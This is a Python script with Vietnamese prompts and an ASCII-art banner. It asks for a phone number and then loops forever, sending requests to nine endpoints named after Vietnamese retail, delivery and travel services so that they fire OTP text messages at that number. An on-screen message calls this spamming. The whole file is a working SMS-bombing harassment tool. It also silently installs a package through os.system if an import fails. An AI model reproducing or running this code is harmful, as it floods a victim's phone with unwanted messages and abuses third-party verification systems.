'''Bản quyền: https://www.facebook.com/preatedy'''
from time import sleep
import requests
import os, sys, requests, random
import time
from random import choice, randint, shuffle

try:
    from pystyle import Center, Anime, Colors, Colorate
except:
    os.system('pip install pystyle')


def banner():
    banner = f"""
 \033[1;93m

'########:::::'###::::'########:'########::'########:
 ##.... ##:::'## ##:::... ##..:: ##.... ##:..... ##::
 ##:::: ##::'##:. ##::::: ##:::: ##:::: ##::::: ##:::
 ##:::: ##:'##:::. ##:::: ##:::: ##:::: ##:::: ##::::
 ##:::: ##: #########:::: ##:::: ##:::: ##::: ##:::::
 ##:::: ##: ##.... ##:::: ##:::: ##:::: ##:: ##::::::
 ########:: ##:::: ##:::: ##:::: ########:: ########:
........:::..:::::..:::::..:::::........:::........:: 
              (nguyen thanh dat)
"""

    for X in banner:
        sys.stdout.write(X)
        sys.stdout.flush()


os.system("cls" if os.name == "nt" else "clear")
banner()
sdt = input(str('\033[1;33mNhập Số Điện Thoại Vào Đây Em: '))
time_delay = int(input('\033[1;33mTime Delay: '))
print('\033[1;97m===========================================================================')
stt = 0
while True:
    stt += 1
    string = requests.post(f'https://api-sms-v2.herokuapp.com/nhap-hang-247?phone={sdt}').text
    string = requests.post(f'https://api-sms-v2.herokuapp.com/elines?phone={sdt}').text
    string = requests.post(f'https://api-sms-v2.herokuapp.com/meta-vn?phone={sdt}').text
    string = requests.post(f'https://api-sms-v2.herokuapp.com/bach-hoa-xanh?phone={sdt}').text
    string = requests.post(f'https://api-sms-v2.herokuapp.com/grab-food?phone={sdt}').text
    string = requests.post(f'https://api-sms-v2.herokuapp.com/tiki?phone={sdt}').text
    string = requests.post(f'https://api-sms-v2.herokuapp.com/gojoy?phone={sdt}').text
    string = requests.post(f'https://api-sms-v2.herokuapp.com/vntrip?phone={sdt}').text
    string = requests.post(f'https://api-sms-v2.herokuapp.com/the-gioi-di-dong?phone={sdt}').text
    print(f'\033[1;97m[{stt}]\033[1;96m Success Send OTP\033[1;94m-\033[1;95mPhone\033[1;94m-\033[1;94m{sdt}')
    for a in range(time_delay, 0, -1):
        print(f'Tiếp Tục Spam Sau {a}s ', end='\r')
        sleep(1)


